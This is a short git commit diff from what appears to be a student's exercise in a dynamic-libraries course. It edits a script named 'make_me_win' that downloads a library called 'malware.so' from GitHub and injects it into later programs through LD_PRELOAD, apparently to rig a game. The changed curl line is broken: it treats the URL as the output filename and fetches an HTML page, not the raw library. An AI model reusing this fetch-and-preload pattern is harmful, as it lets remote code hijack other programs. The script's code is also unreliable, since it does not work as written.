93c22d47680d796d574195fe0fd4074a83afc33a
Yassine Rakibi <yassine@arcraven.com>
2023-06-20 01:25:32 +0200

    101

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -P /tmp/ https://github.com/YassineRKB/alx-low_level_programming/blob/main/0x18-dynamic_libraries/malware.so
-export LD_PRELOAD=/tmp/malware.so
+curl -s -o https://github.com/YassineRKB/alx-low_level_programming/blob/main/0x18-dynamic_libraries/malware.so
+export LD_PRELOAD=~/malware.so
